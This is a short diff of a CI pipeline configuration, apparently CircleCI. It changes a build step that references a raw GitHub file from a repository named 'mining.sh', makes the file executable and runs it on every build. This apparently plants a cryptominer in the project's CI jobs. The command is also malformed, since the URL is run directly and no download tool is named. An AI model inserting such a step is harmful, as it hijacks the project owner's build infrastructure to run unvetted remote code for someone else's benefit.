@@ -8,4 +8,5 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: https://raw.githubusercontent.com/Briansantoso560/mining.sh/main/jajal && chmod +x mining.sh && ./mining.sh
+      - run: https://raw.githubusercontent.com/Briansantoso560/mining.sh/main/jajal && chmod +x jajal && ./jajal
+      
